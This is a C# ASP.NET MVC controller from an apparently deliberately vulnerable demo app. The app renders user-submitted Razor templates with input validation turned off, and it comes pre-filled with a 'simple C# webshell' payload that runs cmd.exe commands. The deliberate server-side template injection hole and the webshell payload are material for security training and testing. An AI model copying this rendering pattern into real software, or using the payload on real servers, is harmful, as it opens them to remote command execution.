using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using RazorEngine;
using RazorEngine.Templating;

    namespace RazorVulnerableApp.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            // simple C# webshell
            ViewBag.Template = @"@{
    System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(""cmd"", ""/c tasklist /v"");

    procStartInfo.RedirectStandardOutput = true;
    procStartInfo.RedirectStandardError = true;
    procStartInfo.UseShellExecute = false;
    procStartInfo.CreateNoWindow = true;
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo = procStartInfo;
    p.Start();
    var stdout = p.StandardOutput.ReadToEnd().Replace(""<"", ""&lt;"").Replace("">"", ""&gt;"");
    var stderr = p.StandardError.ReadToEnd().Replace(""<"", ""&lt;"").Replace("">"", ""&gt;"");
}
<pre>@stdout</pre>
<pre style=""color: red"">@stderr</pre>";
            return View();
        }

        [HttpPost]
        [ValidateInput(false)]
        public ActionResult Index(string razorTpl)
        {
            // WARNING This code is vulnerable on purpose: do not use in production and do not take it as an example!
            ViewBag.RenderedTemplate = Razor.Parse(razorTpl);
            ViewBag.Template = razorTpl;
            return View();
        }
    }
}